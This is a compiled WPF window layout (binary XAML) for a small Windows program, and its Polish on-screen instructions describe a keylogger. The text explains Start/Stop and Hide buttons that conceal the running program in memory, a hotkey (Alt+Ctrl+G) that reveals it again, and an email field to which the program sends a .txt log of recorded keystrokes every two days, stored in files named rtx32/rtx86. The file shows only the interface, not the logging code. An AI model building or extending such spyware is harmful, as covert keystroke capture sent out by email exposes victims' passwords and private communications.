   M S B A M L   `   `   `  ����  WpfApplication8     WpfApplication8.MainWindow   5   	   \ XPresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35R NWindowsBase, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35W SPresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35D 9http://schemas.microsoft.com/winfx/2006/xaml/presentation    5   	   R NSystem.Xaml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089:x,http://schemas.microsoft.com/winfx/2006/xaml     5   	   -   5          � Title$  
MainWindow��5   	   $	��420��6   $	��525��6)   .��5      � $��0,0,0.4,-0.6q�6   $	��391��6!   $	��Top=�6.    � RowDefinitions 5   
   �� 5      $
��213* �6   �� 5      $
��178* �6   .+�5
   
   �� -   5        $��Start��5
      $
��Left=�6!   $��	62,54,0,0q�6<   $	��Top=�6O   $��75��6g   $��28��6�   �� 5   
   -   5        $
��Stop��5      $
��Left=�6    $��	62,99,0,0q�6;   $	��Top=�6N   $��75��6f   $��28��6�   �� 5   
   $
��Menu��6   $
��Left=�6!   $��	22,26,0,0q�6<   $	��Top=�6O   $	��127��6g   $	��161��6t   �� 5   
   $��
Instuction��6   $
��Left=�6'   $��
246,26,0,0q�6B   $	��Top=�6V   $	��295��6n   $	��242��6{   $��2��6�   .��5      �� $
��Left=�6   $��10,10,0,-22q�63   $
��Wrap=�6H   $	��205��6\    J� RenderTransformOrigin$ 0.5,0.5&�6h   $	��268��6�   $	��Top=�6�   �� 6�   $���Start: Uruchamia program                        Stop: Wyłącza program                        Hide: Ukrywa działający program w pamięci komputera ��6�   �� 6M  �� 6Y  $@�:Przytrzymanie Alt + Ctrl + G ujawnia na nowo okno programu��6]  �� 6�  �� 6�  $���Zatwierdź: Po wpisaniu maila program będzie wysyłał na podany wyżej mail wiadomośc z plikiem .txt z odczytem klawiatury komputera raz na 2 dni                        Wyłączenie programu skutkuje zapisaniem wszystkich plików w pliku .txt                                                Cały odczyt z klawiatury zapisuje się w pliku rtx32/rtx��6�  �� 6  $�86��6  �� 6  $
�.txt��6"  �� 60  $$�(pliki w lokalizacji programu)��64  �� 6\  �� 6h  $� ��6l  6w  5      �� 5   
   -   5         ��Name$ Hide1��5      $
��Hide��6    $
��Left=�6/   $��194,113.2,0,0q�6J   $	��Top=�6a   $	��101��6y   $��34��6�   $��1��6�   �� 5   
   -   5         ��Name$ mailBox��5      $
��Left=�6#   $��23��6>   $��
22,8.2,0,0q�6J    �� TextWrapping$
 Wrap=�6^   $�� ��6r   $	��Top=�6z   $	��120��6�   $��1��6�   �� 5   
   -   5        $��Zatwierdź!��5      $
��Left=�6&   $��32,57.2,0,0q�6A   $	��Top=�6V   $��75��6n   $��1��6�   $��19��6�   �� 5   
   $
��Mail��6   $
��Left=�6!   $	��114��6<   $��
10,190,0,0q�6I   $	��Top=�6]   $	��157��6u   $��2��6�   5      5      